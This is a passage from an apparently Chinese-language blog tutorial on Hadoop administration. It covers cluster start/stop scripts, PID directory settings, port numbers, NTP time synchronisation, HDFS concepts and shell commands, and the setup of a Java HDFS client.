class="line">start-yarn.sh/stop-yarn.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 各个服务组件逐一启动/停止</span></span><br><span class="line"><span class="comment"># 分别启动/停止HDFS组件</span></span><br><span class="line">hdfs --daemon start/stop namenode/datanode/secondarynamenode</span><br><span class="line"><span class="comment"># 启动/停止YARN</span></span><br><span class="line">yarn --daemon start/stop  resourcemanager/nodemanager</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于新节点的加入，首先定义好主机名和ssh免密，然后将配置文件分发到该机器</span></span><br><span class="line"><span class="comment"># 然后启动节点</span></span><br><span class="line">hadoop-daemon.sh start datanode</span><br><span class="line"><span class="comment"># 然后启动数据同步命令</span></span><br><span class="line">start-balancer.sh</span><br><span class="line"><span class="comment"># 启动yarn</span></span><br><span class="line">yarn-daemon.sh start nodemanager</span><br></pre></td></tr></table></figure><p>如果集群长时间启动后想去关闭集群，会发现集群无法关闭，这是因为脚本关停是根据服务的pid来关闭的，而hadoop 的 pid 文件默认在 /tmp 文件下，一般七天被系统清理掉，所以导致关停失败，如果需要能使用脚本关停，都开始需要将pid保存到其他路径下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 来到hadoop程序配置文件</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HADOOP_HOME</span></span><br><span class="line">mkdir tmp</span><br><span class="line"><span class="built_in">cd</span> etc/hadoop</span><br><span class="line">vim hadoop-env.sh</span><br><span class="line">:<span class="built_in">set</span> nu</span><br><span class="line"><span class="comment"># 在198行设置成$HADOOP_HOME/tmp</span></span><br><span class="line"><span class="built_in">export</span> HADOOP_PID_DIR=<span class="variable">$&#123;HADOOP_HOME&#125;</span>/tmp</span><br><span class="line"><span class="comment"># 在252行修改</span></span><br><span class="line"><span class="built_in">export</span> HADOOP_SECURE_PID_DIR=<span class="variable">$&#123;HADOOP_PID_DIR&#125;</span></span><br></pre></td></tr></table></figure><h3 id="4-8-Hadoop集群常用脚本">4.8 Hadoop集群常用脚本</h3><p>Hadoop集群启停脚本（包含HDFS，Yarn，Historyserver）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/atguigu/bin</span><br><span class="line">vim myhadoop.sh</span><br><span class="line"><span class="comment"># 写入脚本</span></span><br><span class="line">chmod +x myhadoop.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -lt 1 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"No Args Input..."</span></span><br><span class="line">    <span class="built_in">exit</span> ;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line"><span class="string">"start"</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">" =================== 启动 hadoop集群 ==================="</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">" --------------- 启动 hdfs ---------------"</span></span><br><span class="line">        ssh hadoop102 <span class="string">"/opt/module/hadoop-3.1.3/sbin/start-dfs.sh"</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">" --------------- 启动 yarn ---------------"</span></span><br><span class="line"></span><br><span class="line">        ssh hadoop103 <span class="string">"/opt/module/hadoop-3.1.3/sbin/start-yarn.sh"</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">" --------------- 启动 historyserver ---------------"</span></span><br><span class="line">        ssh hadoop102 <span class="string">"/opt/module/hadoop-3.1.3/bin/mapred --daemon start historyserver"</span></span><br><span class="line">;;</span><br><span class="line"><span class="string">"stop"</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">" =================== 关闭 hadoop集群 ==================="</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">" --------------- 关闭 historyserver ---------------"</span></span><br><span class="line">        ssh hadoop102 <span class="string">"/opt/module/hadoop-3.1.3/bin/mapred --daemon stop historyserver"</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">" --------------- 关闭 yarn ---------------"</span></span><br><span class="line">        ssh hadoop103 <span class="string">"/opt/module/hadoop-3.1.3/sbin/stop-yarn.sh"</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">" --------------- 关闭 hdfs ---------------"</span></span><br><span class="line">        ssh hadoop102 <span class="string">"/opt/module/hadoop-3.1.3/sbin/stop-dfs.sh"</span></span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Input Args Error..."</span></span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>查看三台服务器Java进程脚本：jpsall</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> =============== <span class="variable">$host</span> ===============</span><br><span class="line">        ssh <span class="variable">$host</span> jps </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>最后进行启动分发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/atguigu/bin</span><br><span class="line">vim jpsall</span><br><span class="line">chmod +x jpsall</span><br><span class="line"></span><br><span class="line">xsync /home/atguigu/bin/</span><br></pre></td></tr></table></figure><h3 id="4-9-常用端口号说明">4.9 常用端口号说明</h3><table><thead><tr><th>端口名称</th><th>Hadoop2.x</th><th>Hadoop3.x</th></tr></thead><tbody><tr><td>NameNode内部通信端口</td><td>8020 / 9000</td><td>8020 / 9000/9820</td></tr><tr><td>NameNode HTTP UI</td><td>50070</td><td>9870</td></tr><tr><td>MapReduce查看执行任务端口</td><td>8088</td><td>8088</td></tr><tr><td>历史服务器通信端口</td><td>19888</td><td>19888</td></tr></tbody></table><h3 id="4-10-集群时间同步-可选">4.10 集群时间同步(可选)</h3><blockquote><p>如果服务器在公网环境（能连接外网），可以不采用集群时间同步，因为服务器会定期和公网时间进行校准；如果服务器在内网环境，必须要配置集群时间同步，否则时间久了，会产生时间偏差，导致集群执行任务时间不同步</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ==================时间服务器配置（必须root用户）==============</span></span><br><span class="line"><span class="comment"># 查看所有节点ntpd服务状态和开机自启动状态</span></span><br><span class="line">sudo systemctl status ntpd</span><br><span class="line">sudo systemctl start ntpd</span><br><span class="line">sudo systemctl is-enabled ntpd</span><br><span class="line"><span class="comment"># 修改hadoop102的ntp.conf配置文件</span></span><br><span class="line">sudo vim /etc/ntp.conf</span><br><span class="line"><span class="comment"># 修改内容如下</span></span><br><span class="line"><span class="comment"># 修改1（授权192.168.31.0-192.168.31.255网段上的所有机器可以从这台机器上查询和同步时间）</span></span><br><span class="line"><span class="comment"># restrict 192.168.31.0 mask 255.255.255.0 nomodify notrap 这行注释打开</span></span><br><span class="line"><span class="comment"># 修改2（集群在局域网中，不使用其他互联网上的时间）</span></span><br><span class="line"><span class="comment"># 注释以下四条</span></span><br><span class="line"><span class="comment">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改hadoop102的/etc/sysconfig/ntpd 文件</span></span><br><span class="line">sudo vim /etc/sysconfig/ntpd</span><br><span class="line"><span class="comment"># 增加内容如下（让硬件时间与系统时间一起同步）</span></span><br><span class="line">SYNC_HWCLOCK=yes</span><br><span class="line"><span class="comment"># 重新启动ntpd服务</span></span><br><span class="line">sudo systemctl start ntpd</span><br><span class="line"><span class="comment"># 设置ntpd服务开机启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> ntpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========================其他机器配置（必须root用户）==========</span></span><br><span class="line"><span class="comment"># 关闭所有节点上ntp服务和自启动</span></span><br><span class="line">sudo systemctl stop ntpd</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> ntpd</span><br><span class="line">sudo systemctl stop ntpd</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> ntpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在其他机器配置1分钟与时间服务器同步一次</span></span><br><span class="line">sudo crontab -e</span><br><span class="line">*/1 * * * * /usr/sbin/ntpdate hadoop102</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试，修改任意机器时间</span></span><br><span class="line">sudo date -s <span class="string">"2023-9-11 11:11:11"</span></span><br><span class="line"><span class="comment"># 1分钟后查看机器是否与时间服务器同步</span></span><br><span class="line">sudo date</span><br></pre></td></tr></table></figure><h1>二、HDFS</h1><h2 id="1、HDFS概述">1、HDFS概述</h2><h3 id="1-1-简介-v2">1.1 简介</h3><p>HDFS（Hadoop Distributed File System），它是一个<strong>文件系统</strong>，用于存储文件，通过目录树来定位文件；其次它是<strong>分布式的</strong>，由很多服务器联合起来实现其功能，集群中的服务器有各自的角色。<strong>HDFS的使用场景：适合一次写入，多次读出的场景</strong>。一个文件经过创建、写入和关闭之后就不需要改变</p><h3 id="1-2-HDFS优缺点">1.2 HDFS优缺点</h3><p><strong>优点</strong></p><ul><li>高容错性：一个数据会自动保存多个副本，某个副本丢失后，它可以自动恢复</li><li>适合处理大数据：无论是数据规模还是文件数量规模大都可以处理</li><li>可构建在廉价的机器上</li></ul><p><strong>缺点</strong></p><ul><li><p>不适合低延迟的数据访问：如毫秒级的存储数据是做不到的</p></li><li><p>无法高效地对大量小文件进行存储：</p><ul><li>存储大量小文件时，会占用NameNode大量内存去存储文件目录信息和块信息，而NameNode的内存是有限的</li><li>小文件存储的寻址时间会超过读取时间，它违反了HDFS的设计目标</li></ul></li><li><p>不支持并发写入和文件的随机修改</p><ul><li>不允许多个线程同时写同一文件</li><li>仅支持数据追加，不支持随机修改</li></ul></li></ul><h3 id="1-3-HDFS组成架构">1.3 HDFS组成架构</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330903.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251330904.png" alt></p><h3 id="1-4-HDFS文件块大小-面试重点">1.4 HDFS文件块大小(面试重点)</h3><p>在Hadoop1.x中文件块大小默认为64M，而在2.x和3.x中为128M。当寻址时间为传输时间的1%时为最佳状态。文件块的大小太小，则会导致大文件被分割成太多块，增加寻址时间。而文件块大小太大，则会使得传输时间远大于寻址时间。文件块的大小主要取决于磁盘的传输速率</p><h2 id="2、HDFS的Shell操作-重点">2、HDFS的Shell操作(重点)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 帮助查询某个命令</span></span><br><span class="line">hadoop fs -<span class="built_in">help</span> rm</span><br><span class="line"><span class="comment"># 创建/sanguo文件夹</span></span><br><span class="line">hadoop fs -mkdir /sanguo</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================上传================</span></span><br><span class="line"><span class="comment"># -moveFromLocal：从本地剪切粘贴到HDFS，内容自己输入</span></span><br><span class="line">vim shuguo.txt</span><br><span class="line">hadoop fs  -moveFromLocal  ./shuguo.txt  /sanguo</span><br><span class="line"><span class="comment"># -copyFromLocal：从本地文件系统中拷贝文件到HDFS路径去</span></span><br><span class="line">vim weiguo.txt</span><br><span class="line">hadoop fs -copyFromLocal weiguo.txt /sanguo</span><br><span class="line"><span class="comment"># -put：等同于copyFromLocal，生产环境更习惯用put</span></span><br><span class="line">vim wuguo.txt</span><br><span class="line">hadoop fs -put ./wuguo.txt /sanguo</span><br><span class="line"><span class="comment"># -appendToFile：追加一个文件到已经存在的文件末尾</span></span><br><span class="line">vim liubei.txt</span><br><span class="line">hadoop fs -appendToFile liubei.txt /sanguo/shuguo.txt</span><br><span class="line"><span class="comment"># ==================下载==================</span></span><br><span class="line"><span class="comment"># -copyToLocal：从HDFS拷贝到本地</span></span><br><span class="line">hadoop fs -copyToLocal /sanguo/shuguo.txt ./</span><br><span class="line"><span class="comment"># -get：等同于copyToLocal，生产环境更习惯用get</span></span><br><span class="line">hadoop fs -get /sanguo/shuguo.txt ./shuguo2.txt</span><br><span class="line"><span class="comment"># ===================HDFS直接操作==============</span></span><br><span class="line"><span class="comment"># -ls: 显示目录信息</span></span><br><span class="line">hadoop fs -ls /sanguo</span><br><span class="line"><span class="comment"># -cat：显示文件内容</span></span><br><span class="line">hadoop fs -cat /sanguo/shuguo.txt</span><br><span class="line"><span class="comment"># -chgrp、-chmod、-chown：Linux文件系统中的用法一样，修改文件所属权限</span></span><br><span class="line">hadoop fs -chmod 666 /sanguo/shuguo.txt</span><br><span class="line">hadoop fs -chown atguigu:atguigu /sanguo/shuguo.txt</span><br><span class="line"><span class="comment"># -mkdir：创建路径</span></span><br><span class="line">hadoop fs -mkdir /jinguo</span><br><span class="line">hadoop fs -mkdir -p /jinguo</span><br><span class="line"><span class="comment"># -cp：从HDFS的一个路径拷贝到HDFS的另一个路径</span></span><br><span class="line">hadoop fs -cp /sanguo/shuguo.txt /jinguo</span><br><span class="line"><span class="comment"># -mv：在HDFS目录中移动文件</span></span><br><span class="line">hadoop fs -mv /sanguo/wuguo.txt /jinguo</span><br><span class="line">hadoop fs -mv /sanguo/weiguo.txt /jinguo</span><br><span class="line"><span class="comment"># -tail：显示一个文件的末尾1kb的数据</span></span><br><span class="line">hadoop fs -tail /jinguo/shuguo.txt</span><br><span class="line"><span class="comment"># -rm：删除文件或文件夹</span></span><br><span class="line">hadoop fs -rm /sanguo/shuguo.txt</span><br><span class="line"><span class="comment"># -rm -r：递归删除目录及目录里面内容；-f强制删除</span></span><br><span class="line">hadoop fs -rm -r /sanguo</span><br><span class="line"><span class="comment"># -du统计文件夹的大小信息</span></span><br><span class="line">hadoop fs -du -s -h /jinguo</span><br><span class="line">hadoop fs -du  -h /jinguo</span><br><span class="line"><span class="comment"># -setrep：设置HDFS中文件的副本数量</span></span><br><span class="line"><span class="comment"># 这么多副本，还得看DataNode的数量。因为目前只有3台设备，最多也就3个副本，只有节点数的增加到10台时，副本数才能达到10</span></span><br><span class="line">hadoop fs -setrep 10 /jinguo/shuguo.txt</span><br><span class="line"><span class="comment"># 查询这个文件是否存在，存在就返回0，不存在返回1，</span></span><br><span class="line">hadoop fs -<span class="built_in">test</span> -e /jinguo</span><br><span class="line"><span class="comment"># 查询该路径下的文件夹数量，文件数量，和文件总大小</span></span><br><span class="line">hadoop fs -count /jinguo</span><br><span class="line"><span class="comment"># 查看某个压缩文件的内容</span></span><br><span class="line">hadoop fs -cat /origin_data/gmall/<span class="built_in">log</span>/topic_log/2020-06-14/* | zcat</span><br></pre></td></tr></table></figure><h2 id="3、HDFS的API操作">3、HDFS的API操作</h2><h3 id="3-1-环境准备">3.1 环境准备</h3><p>windows要启动hadooop，首先进去<a href="https://github.com/cdarlint/winutils" target="_blank" rel="noopener" title="github官网">github官网</a>下载对应版本的hadoop，这里我下载了3.1.0，下载完成后将路径的bin目录放入电脑的环境变量；验证Hadoop环境变量是否正常，双击winutils.exe，如果无报错即正常(报错大概率没有微软运行库，安装一下即可，还不行重启试试)</p><p>在IDEA中创建一个Maven工程HdfsClientDemo，并导入相应的依赖坐标</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在项目的src/main/resources目录下，新建一个文件，命名为&quot;log4j.properties&quot;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">log4j.rootLogger&#x3D;INFO, stdout  </span><br><span class="line">log4j.appender.stdout&#x3D;org.apache.log4j.ConsoleAppender  </span><br><span class="line">log4j.appender.stdout.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern&#x3D;%d %p [%c] - %m%n  </span><br><span class="line">log4j.appender.logfile&#x3D;org.apache.log4j.FileAppender  </span><br><span class="line">log4j.appender.logfile.File&#x3D;target&#x2F;spring.log  </span><br><span class="line">log4j.appender.logfile.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.logfile.layout.ConversionPattern&#x3D;%d %p [%c] - %m%n</span><br></pre></td></tr></table></figure><p>创建包名：com.atguigu.hdfs，创建HdfsClient类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HdfsClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMkdirs</span><span class="params">()</span> <span class="keyword">throws</span> IOException, URISyntaxException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1 获取文件系统</span></span><br><span class="line">        Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">        <span class="comment">// 默认使用windows用户名，要配置用户</span></span><br><span class="line">        <span class="comment">// FileSystem fs = FileSystem.get(new URI("hdfs://hadoop102:8020"), configuration);</span></span><br><span class="line">        FileSystem fs = FileSystem.get(<span class="keyword">new</span> URI(<span class="string">"hdfs://hadoop102:8020"</span>), configuration,<span class="string">"atguigu"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 创建目录</span></span><br><span class="line">        fs.mkdirs(<span class="keyword">new</span> Path(<span class="string">"/xiyou/huaguoshan/"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 关闭资源</span></span><br><span class="line">        fs.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-HDFS的API案例实操">3.2 HDFS的API案例实操</h3><p>** HDFS文件上传（测试参数优先级）**</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCopyFromLocalFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException, URISyntaxException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 获取文件系统</span></span><br><span class="line">    Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">    configuration.set(<span class="string">"dfs.replication"</span>, <span class="string">"2"</span>);</span><br><span class="line">    FileSystem fs = FileSystem.get(<span class="keyword">new</span> URI(<span class="string">"hdfs://hadoop102:8020"</span>), configuration, <span class="string">"atguigu"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2 上传文件</span></span><br><span class="line">    fs.copyFromLocalFile(<span class="keyword">new</span> Path(<span class="string">"d:/sunwukong.txt"</span>), <span class="keyword">new</span> Path(<span class="string">"/xiyou/huaguoshan"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3 关闭资源</span></span><br><span class="line">    fs.close();</span><br><span class="line">｝</span><br></pre></td></tr></table></figure><p>将<code>hdfs-site.xml</code>拷贝到项目的resources资源目录下，测试发现参数优先级排序：（1）客户端代码中设置的值 &gt;（2）ClassPath下的用户自定义配置文件 &gt;（3）然后是服务器的自定义配置（xxx-site.xml） &gt;（4）服务器的默认配置（xxx-default.xml）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来常规API编写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 